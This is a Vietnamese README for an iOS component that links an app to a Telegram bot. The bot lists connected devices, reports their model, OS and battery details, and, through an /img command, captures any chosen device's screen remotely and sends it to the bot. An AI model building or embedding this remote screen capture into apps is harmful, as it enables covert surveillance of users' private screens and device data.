# Bot-Photo-Send
> [!NOTE]  
> Dự án gửi ảnh lên bot 1 cách đơn giản và chưa được tối ưu hiệu quả cao bạn tự tinh chỉnh thêm.
> Mọi bước đều có ở log.txt ở Documents của App.

## Import file vào các nợi gọi 2 hàm dưới
`#import "TelegramBot.h`

## Khởi chạy bot
` [[TelegramBot sharedInstance] startListeningForCommands];`

## Hàm chụp ảnh 
`[[TelegramBot sharedInstance] autoCaptureAndSend];`

## Hướng dẫn

> Bạn cần import file TelegramBot.h vào bất kỳ nơi nào bạn muốn sử dụng các hàm của TelegramBot.
Ví dụ: Nếu bạn gọi các hàm này trong ViewController.m, hãy thêm #import "TelegramBot.h" ở đầu file.

### Khởi chạy bot:

> Hàm startListeningForCommands sẽ bắt đầu lắng nghe các lệnh từ Telegram (ví dụ: /listuuid, /list, /img).
Bạn nên gọi hàm này một lần khi ứng dụng khởi động (ví dụ: trong AppDelegate hoặc viewDidLoad của ViewController).

### Hàm chụp ảnh và gửi tự động:

> Hàm autoCaptureAndSend sẽ chụp ảnh màn hình sau 1.5 giây và gửi lên Telegram cùng với tin nhắn #autofeedback.
Bạn có thể gọi hàm này bất kỳ lúc nào bạn muốn chụp và gửi ảnh (ví dụ: khi người dùng nhấn một nút).

### Các lệnh bot

> /listuuid (sẽ hiẻn thị danh sách uuid các máy kết nối)
```
Số người dùng đang hoạt động: 1
Danh sách UUID:
1. 6CB59680-FF68-4078-85DA-EF636FF251C9
```

> /list <UUID> (thông tin chi tiết hơn)
```
Số người dùng đang hoạt động: 1
Danh sách người dùng:
deviceName: iPhone 12,
systemVersion: 15.0,
systemName: iOS,
model: iPhone,
- battery
Battery: 80% || Đang Sạc
uuid: 6CB59680-FF68-4078-85DA-EF636FF251C9
```

> /img <UUID> (gửi ảnh màn hình của uuid đó lên bot)
```
[Hình Ảnh] - [Nội dung]
```
